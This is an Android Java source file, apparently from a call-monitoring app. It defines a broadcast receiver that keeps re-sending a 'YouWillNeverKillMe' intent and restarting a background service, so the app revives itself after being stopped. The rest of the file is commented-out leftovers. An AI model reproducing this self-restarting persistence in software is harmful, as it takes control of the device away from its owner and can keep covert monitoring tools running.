package com.postal.omniscient.postal.service;

import android.app.ActivityManager;
import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Looper;
import android.support.v4.content.AsyncTaskLoader;
import android.util.Log;
import android.widget.Toast;

import com.postal.omniscient.MainActivity;
import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.catchPhone.Call.PhoneCall;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

/**
 * Created by Alexandr on 12.05.2016.
 */
public class RestartServiceReceiver extends BroadcastReceiver
{

    private static final String TAG = "RestartServiceReceiver";
    private static final String APP_PREFERENCES_NAME = "MY_PREFERENCES";
    private static final String PREFERENCES_KEY_IS_CALL = "call";
    private static final String IS_CALL_NO = "noCall";
    private SharedPreferences mSettings = null;


    @Override
    public void onReceive(Context context, Intent intent) {


        Log.i("MyMsg", " Receive Start");
        long sec = 1000 * 2;
        AsyncR ad = new AsyncR(context);

        mSettings = context.getSharedPreferences(APP_PREFERENCES_NAME, Context.MODE_PRIVATE);
        String IS_CALL = mSettings.getString(PREFERENCES_KEY_IS_CALL, "");


        try {
            Thread.sleep(sec);// ВРЕМЯ СНА ЦЫКЛА ВКЛЮЧИТЬ 1 ЧАС
//            if(IS_CALL.equals(IS_CALL_NO)) {
                context.sendBroadcast(new Intent("YouWillNeverKillMe"));
//            }
                //ad.forceLoad();

                   // ad = null;

        } catch (Exception e) {
            Log.e("MyMsg","1"+ e.toString());
        }

//        Log.i("MyMsg", " Resiver END");

        //context.startService(new Intent(context.getApplicationContext(), MyService.class));



//            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
//            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
//                if (MyService.class.getName().equals(service.service.getClassName())) {
//                    Log.i("MyMsg", "рабочий");
//                }
//                Log.i("MyMsg", " не ребочий");
//
//        }
    }

    public class AsyncR extends AsyncTaskLoader {


        public AsyncR(Context context) {
            super(context);

        }
        Toast toast;
        public AsyncR(Context applicationContext, Toast toast) {
            super(applicationContext);
            this.toast = toast;
        }


        @Override
        public Object loadInBackground() {

            long sec = 1000 * 20;
            try {
               // while(true) {
                    //Thread.sleep(sec);

//                    Log.i("MyMsg", " Resiver TASC START");
                //}
            } catch (Exception e) {
                Log.e("MyMsg","2"+ e.toString());
            }

            Intent par = new Intent(getContext(), MyService.class);

            getContext().startService(par);
            //getContext().sendBroadcast(new Intent("YouWillNeverKillMe"));
            return null;
        }
    }


}